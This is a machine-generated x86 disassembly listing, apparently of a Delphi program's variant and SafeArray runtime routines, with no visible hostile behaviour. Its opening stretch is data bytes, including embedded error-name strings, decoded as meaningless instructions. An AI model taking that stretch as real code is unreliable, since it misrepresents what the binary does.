add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
out 0x40 eax
add [ eax + eax ] cl
add [ eax ] al
hlt
outsd
jb r-xdata
outsd
jb r-xdata
popad
add ah bl
xor [ eax ] eax
adc eax 0x72615645
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
outsb
js r-xdata
add [ eax ] al
add [ eax ] al
outsd
xor [ eax ] eax
pop ss
inc ebp
push esi
popad
jb r-xdata
xor al 0x40
jne r-xdata
jb r-xdata
inc ebp
jb r-xdata
inc ebp
jb r-xdata
inc eax
add [ edi + 0x40 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x6f727245
jb r-xdata
dec esi
jne r-xdata
jbe r-xdata
je r-xdata
inc eax
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
je r-xdata
inc eax
add [ eax + 0x40e8 ] dh
adc al 0xe9
inc eax
add [ eax ] al
add [ eax ] al
dec edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040e8 ] dh
add [ eax ] al
add ah dh
jns r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x18 ] cl
inc eax
add [ eax + eax ] cl
add [ eax ] al
hlt
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sar [ eax - 0x17 ] 0x40
call 0xffffffff8c253785
mov ebx eax
insb
dec edi
jo r-xdata
pop ebp
insb
imul esp [ esi + ecx * 2 + 0x75 ] 0x704f6c6c
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
inc eax
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
xor [ eax ] eax
sbb al [ ebp + 0x56 ]
popad
jb r-xdata
add [ eax ] al
outsd
jb r-xdata
add [ eax ] al
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
jb r-xdata
add [ ebp - 0x601703bb ] cl
push ebp
jb r-xdata
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x17 ] bh
inc eax
add [ eax + eax ] cl
add [ eax ] al
jo r-xdata
retn
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 8 ] dl
inc eax
add [ eax + eax ] cl
add [ eax ] al
hlt
jmp r-xdata
jns r-xdata
xor eax eax
push ebp
push sub_40ea77
push [ fs : eax ]
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_414370
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_414370
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb48
call sub_4039b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ea7e
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403fa0
retn
inc eax
add [ edi + edi * 8 + 0x30 ] ah
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e9e5
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
outsb
inc eax
sub_40e994
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e9de
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb0c
call sub_4039b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e9e5
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_40e9e8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40ea77
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_414370
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_414370
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb48
call sub_4039b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ea7e
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403fa0
retn
sub_40ea84
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40eace
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb0c
call sub_4039b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ead5
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_40ead8
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40eb22
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb0c
call sub_4039b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eb29
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_40eb2c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40ebbb
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_414370
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_414370
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb48
call sub_4039b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ebc2
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403fa0
retn
sub_40ebc8
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40ec12
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb0c
call sub_4039b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ec19
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_40ec1c
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40ee61
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb0c
call sub_4039b8
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb0c
call sub_4039b8
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ee68
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403fa0
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_403fa0
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb0c
call sub_4039b8
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb0c
call sub_4039b8
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb0c
call sub_4039b8
jmp r-xdata
dec eax
je r-xdata
call sub_40e994
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb0c
call sub_4039b8
jmp r-xdata
jmp r-xdata
call sub_40ea84
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb0c
call sub_4039b8
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40b2f8
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb48
call sub_4039b8
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb0c
call sub_4039b8
jmp r-xdata
jmp r-xdata
sub_40ee7c
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_40e9e8
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_40eb2c
jmp r-xdata
jmp r-xdata
call sub_40ec1c
sub_40eeb0
push ebx
push esi
mov esi edx
mov ebx eax
call sub_4027fc
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
call sub_4027fc
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40ee7c
pop esi
pop ebx
retn
call sub_4027fc
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40ee7c
jmp r-xdata
call sub_40283c
mov edx eax
mov eax edx
call sub_4039b8
mov ecx esi
mov edx ebx
mov eax 0x80020005
call sub_40ee7c
jmp r-xdata
pop esi
pop ebx
retn
sub_40ef34
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40ef7e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb0c
call sub_4039b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ef85
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_40ef9c
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40efcc
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40efcc
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40f028
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
mov ax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40ee70
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_40ee70
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40ef9c
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_40ee70
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_40ee70
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_40efcc
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_40ee70
mov eax [ ebp - 0x314 ]
call sub_40f220
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_40f1a4
push ebx
push esi
push ecx
mov ebx eax
mov si [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_40ee70
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_403f7c
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_414940
test al al
je r-xdata
mov eax ebx
call sub_40f028
jmp r-xdata
push ebx
call VariantClear
call sub_40ee70
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_40f23c
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40f26c
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40f26c
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40f2c8
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40ee70
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_40ee70
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_40f220
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_40ebc8
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_40ee70
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_40ee70
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40f23c
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_40f26c
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_40ee70
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_40ee70
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f49c
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov di [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_40f1a4
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_40ee70
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_403fd0
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_414940
test al al
je r-xdata
mov ecx sub_40f494
mov edx esi
mov eax ebx
call sub_40f2c8
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_40ee70
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_40f548
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_40f49c
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_40f1a4
sub_40f58c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f5e8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f548
lea eax [ ebp - 0x10 ]
call [ rw-data ]
movzx ecx di
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40f814
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f5ef
lea eax [ ebp - 0x10 ]
call sub_40f220
retn
sub_40f5f8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f636
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412c60
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413610
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f63d
lea eax [ ebp - 0x4 ]
call sub_40465c
retn
sub_40f644
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f682
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412538
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4135e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f689
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_40f690
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f6ce
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_413304
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413674
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f6d5
lea eax [ ebp - 0x4 ]
call sub_4058a0
retn
sub_40f6dc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f71a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_413238
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413648
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f721
lea eax [ ebp - 0x4 ]
call sub_4058a0
retn
sub_40f728
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0x14
jb r-xdata
mov edx esi
and dx 0xfff
cmp dx 0x14
jae r-xdata
mov edx ebx
mov eax edi
mov ecx 0x8
call sub_40f814
push esi
push 0x0
push 0x400
push edi
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40ee7c
jmp r-xdata
mov edx esi
call sub_40e9e8
push esi
push 0x0
push 0x400
push ebx
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40ee7c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_40f7a8
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov ebx edx
mov edi eax
mov bp [ ebx ]
cmp bp 0x101
jne r-xdata
mov edx esp
mov eax ebp
call sub_414940
test al al
je r-xdata
mov edx ebx
mov eax edi
mov ecx esi
call sub_40f58c
jmp r-xdata
mov edx esp
mov eax esi
call sub_414940
test al al
je r-xdata
push esi
mov ecx ebx
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx esi
call sub_40f728
mov ecx ebx
mov edx edi
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
jmp r-xdata
sub_40f814
push ebx
push esi
mov ebx edx
mov esi eax
mov ax [ ebx ]
movzx edx ax
cmp ecx edx
jne r-xdata
cmp ax 0x400c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40f548
pop esi
pop ebx
retn
mov edx ecx
cmp edx 0x14
ja r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f814
jmp r-xdata
mov edx ecx
sub edx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f859 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_40f644
jmp r-xdata
dec edx
je r-xdata
cmp [ ebx ] 0x1
jne r-xdata
mov eax esi
call sub_40ef88
jmp r-xdata
mov eax ebx
call sub_410180
mov edx eax
mov eax esi
call sub_41348c
jmp r-xdata
mov eax ebx
call sub_40fbd8
mov edx eax
mov eax esi
call sub_4133ec
jmp r-xdata
mov eax ebx
call sub_411544
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax esi
call sub_4134d8
jmp r-xdata
mov eax ebx
call sub_4111ac
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_4134fc
jmp r-xdata
mov eax ebx
call sub_411e84
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax esi
call sub_413528
jmp r-xdata
mov eax ebx
call sub_41191c
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_413554
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f5f8
jmp r-xdata
mov eax ebx
call sub_410c98
mov edx eax
mov eax esi
call sub_413580
jmp r-xdata
mov eax ebx
call sub_410028
mov edx eax
mov eax esi
call sub_41346c
jmp r-xdata
mov eax ebx
call sub_4100d8
mov edx eax
mov eax esi
call sub_41340c
jmp r-xdata
mov eax ebx
call sub_410278
mov edx eax
mov eax esi
call sub_41342c
jmp r-xdata
mov eax ebx
call sub_410350
